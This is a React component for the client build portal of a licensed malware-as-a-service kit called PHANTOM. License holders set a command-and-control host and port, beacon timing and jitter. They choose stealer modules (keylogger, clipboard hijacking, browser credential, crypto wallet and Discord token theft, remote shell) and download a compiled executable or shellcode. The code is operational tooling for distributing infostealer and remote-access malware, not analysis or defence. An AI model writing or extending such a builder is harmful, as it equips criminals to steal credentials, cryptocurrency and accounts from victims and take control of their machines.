import { useState, useEffect } from 'react'
import useAgentStore, { API_BASE as API } from '../store/useAgentStore'

export default function ClientPortal() {
  const { token, logout } = useAgentStore()
  const headers = { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }

  const [license,   setLicense]   = useState(null)
  const [licErr,    setLicErr]    = useState(null)
  const [building,  setBuilding]  = useState(false)
  const [buildErr,  setBuildErr]  = useState(null)
  const [buildUUID, setBuildUUID] = useState(null)

  const [form, setForm] = useState({
    c2_host:    '',
    c2_port:    8443,
    poll_ms:    30000,
    jitter_pct: 20,
    format:     'pe',
    features: {
      keylogger:  true,
      clipjack:   true,
      screenshot: true,
      browser:    true,
      crypto:     true,
      discord:    true,
      clipboard:  true,
      shell:      false,
    },
  })

  useEffect(() => {
    fetch(`${API}/phantom/licenses/me`, { headers })
      .then(r => r.ok ? r.json() : r.json().then(e => Promise.reject(e.detail)))
      .then(setLicense)
      .catch(e => setLicErr(String(e)))
  }, [token])

  const handleBuild = async e => {
    e.preventDefault()
    setBuilding(true); setBuildErr(null); setBuildUUID(null)
    try {
      const r = await fetch(`${API}/phantom`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          c2_host:    form.c2_host.trim(),
          c2_port:    Number(form.c2_port),
          poll_ms:    Number(form.poll_ms),
          jitter_pct: Number(form.jitter_pct),
          format:     form.format,
          features:   form.features,
        }),
      })
      if (!r.ok) {
        const e = await r.json()
        throw new Error(e.detail || r.statusText)
      }
      const uuid = r.headers.get('X-Build-UUID') || ''
      setBuildUUID(uuid)
      // Stream download
      const blob = await r.blob()
      const url  = URL.createObjectURL(blob)
      const a    = document.createElement('a')
      a.href     = url
      a.download = form.format === 'bin' ? 'phantom.bin' : 'phantom.exe'
      document.body.appendChild(a); a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)
      // Refresh license counter
      fetch(`${API}/phantom/licenses/me`, { headers }).then(r => r.ok && r.json()).then(l => l && setLicense(l))
    } catch (e) { setBuildErr(e.message) }
    finally     { setBuilding(false) }
  }

  const feat = (name, label) => (
    <label key={name} style={{ display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer', userSelect: 'none' }}>
      <input type="checkbox" checked={form.features[name]}
        onChange={e => setForm(f => ({ ...f, features: { ...f.features, [name]: e.target.checked } }))}
        style={{ accentColor: '#ff3131', width: 12, height: 12 }} />
      <span style={{ fontSize: 11, color: '#888', letterSpacing: 1 }}>{label}</span>
    </label>
  )

  const dead = license && (!license.is_active ||
    (license.expires_at && new Date(license.expires_at) < new Date()) ||
    (license.max_builds != null && license.build_count >= license.max_builds))

  return (
    <div style={{ minHeight: '100vh', background: '#0a0a0a', display: 'flex', flexDirection: 'column' }}>

      {/* Top bar */}
      <header style={{ display: 'flex', alignItems: 'center', gap: 12, height: 48, padding: '0 24px', background: '#111', borderBottom: '1px solid #1e1e1e', flexShrink: 0 }}>
        <span style={{ fontSize: 14, fontWeight: 700, letterSpacing: 1 }}>
          <span style={{ color: '#ff3131' }}>PHA</span><span style={{ color: '#ff3131', opacity: 0.7 }}>N</span><span style={{ color: '#ff3131' }}>TOM</span>
          <span style={{ color: '#888', margin: '0 8px', fontSize: 10 }}>//</span>
          <span style={{ color: '#dde1e8' }}>BUILD PORTAL</span>
        </span>
        <div style={{ flex: 1 }} />
        <button onClick={logout}
          style={{ background: 'transparent', border: '1px solid #1e1e1e', color: '#888', padding: '4px 12px', fontSize: 11, fontFamily: 'inherit', letterSpacing: 2, cursor: 'pointer' }}>
          DISCONNECT
        </button>
      </header>

      <div style={{ flex: 1, overflow: 'auto', display: 'flex', justifyContent: 'center', padding: '32px 16px' }}>
        <div style={{ width: '100%', maxWidth: 500 }}>

          {/* License status card */}
          <div style={{ background: '#111', border: '1px solid #1e1e1e', padding: '14px 18px', marginBottom: 24 }}>
            <div style={{ fontSize: 9, color: '#333', letterSpacing: 3, marginBottom: 10 }}>LICENSE STATUS</div>
            {licErr ? (
              <span style={{ fontSize: 11, color: '#f85149' }}>{licErr}</span>
            ) : !license ? (
              <span style={{ fontSize: 11, color: '#444' }}>loading...</span>
            ) : (
              <div style={{ display: 'flex', gap: 24, alignItems: 'center', flexWrap: 'wrap' }}>
                <div>
                  <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 3 }}>KEY</div>
                  <div style={{ fontSize: 11, fontFamily: 'monospace', color: '#dde1e8' }}>{license.key}</div>
                </div>
                {license.label && (
                  <div>
                    <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 3 }}>LABEL</div>
                    <div style={{ fontSize: 11, color: '#888' }}>{license.label}</div>
                  </div>
                )}
                <div>
                  <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 3 }}>BUILDS</div>
                  <div style={{ fontSize: 11, fontFamily: 'monospace', color: dead ? '#f85149' : '#3fb950' }}>
                    {license.build_count} / {license.max_builds ?? '∞'}
                  </div>
                </div>
                {license.expires_at && (
                  <div>
                    <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 3 }}>EXPIRES</div>
                    <div style={{ fontSize: 11, fontFamily: 'monospace', color: '#555' }}>
                      {new Date(license.expires_at).toLocaleDateString('fr-FR')}
                    </div>
                  </div>
                )}
                <span className={`badge badge-${dead ? 'red' : 'green'}`} style={{ fontSize: 9 }}>
                  {!license.is_active ? 'REVOKED' :
                   license.expires_at && new Date(license.expires_at) < new Date() ? 'EXPIRED' :
                   license.max_builds != null && license.build_count >= license.max_builds ? 'SPENT' : 'ACTIVE'}
                </span>
              </div>
            )}
          </div>

          {/* Build form */}
          <div style={{ fontSize: 9, color: '#444', letterSpacing: 3, marginBottom: 16 }}>BUILD CONFIGURATION</div>

          {dead ? (
            <div style={{ background: '#2d1818', border: '1px solid #5c2020', padding: '14px 18px', fontSize: 11, color: '#f85149' }}>
              License inactive — contact your operator to renew.
            </div>
          ) : (
            <form onSubmit={handleBuild} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>

              <div>
                <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 5 }}>C2 HOST</div>
                <input className="k-input" placeholder="attacker.example.com or 1.2.3.4" required
                  value={form.c2_host} onChange={e => setForm(f => ({ ...f, c2_host: e.target.value }))} />
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 10 }}>
                <div>
                  <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 5 }}>PORT</div>
                  <input className="k-input" type="number" min={1} max={65535}
                    value={form.c2_port} onChange={e => setForm(f => ({ ...f, c2_port: e.target.value }))} />
                </div>
                <div>
                  <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 5 }}>POLL (ms)</div>
                  <input className="k-input" type="number" min={5000} max={600000}
                    value={form.poll_ms} onChange={e => setForm(f => ({ ...f, poll_ms: e.target.value }))} />
                </div>
                <div>
                  <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 5 }}>JITTER %</div>
                  <input className="k-input" type="number" min={0} max={60}
                    value={form.jitter_pct} onChange={e => setForm(f => ({ ...f, jitter_pct: e.target.value }))} />
                </div>
              </div>

              <div>
                <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 8 }}>MODULES</div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
                  {feat('keylogger',  'Keylogger')}
                  {feat('clipjack',   'Clipboard hijack')}
                  {feat('screenshot', 'Screenshot')}
                  {feat('browser',    'Browser credentials')}
                  {feat('crypto',     'Crypto wallet scanner')}
                  {feat('discord',    'Discord token')}
                  {feat('clipboard',  'Clipboard dump')}
                  {feat('shell',      'Remote shell')}
                </div>
              </div>

              <div>
                <div style={{ fontSize: 9, color: '#333', letterSpacing: 2, marginBottom: 5 }}>OUTPUT FORMAT</div>
                <div style={{ display: 'flex', gap: 8 }}>
                  {[['pe', 'PE (.exe)'], ['bin', 'Shellcode (.bin)']].map(([v, l]) => (
                    <label key={v} style={{ display: 'flex', alignItems: 'center', gap: 6, cursor: 'pointer' }}>
                      <input type="radio" name="format" value={v} checked={form.format === v}
                        onChange={() => setForm(f => ({ ...f, format: v }))}
                        style={{ accentColor: '#ff3131' }} />
                      <span style={{ fontSize: 11, color: '#888', letterSpacing: 1 }}>{l}</span>
                    </label>
                  ))}
                </div>
              </div>

              {buildErr && (
                <p style={{ fontSize: 10, color: '#f85149', letterSpacing: 1 }}>// {buildErr.toUpperCase()} //</p>
              )}

              {buildUUID && !buildErr && (
                <p style={{ fontSize: 9, color: '#3fb950', letterSpacing: 1 }}>
                  BUILD {buildUUID.slice(0, 8).toUpperCase()} — DOWNLOAD STARTED
                </p>
              )}

              <button type="submit" disabled={building}
                style={{ background: building ? 'transparent' : '#ff3131', border: '1px solid #ff3131', color: building ? '#ff3131' : '#0a0a0a', padding: '12px', fontFamily: 'inherit', fontSize: 11, letterSpacing: 3, cursor: 'pointer', marginTop: 4, transition: 'all .15s' }}>
                {building ? '[ COMPILING... ]' : '[ BUILD + DOWNLOAD ]'}
              </button>

            </form>
          )}
        </div>
      </div>
    </div>
  )
}
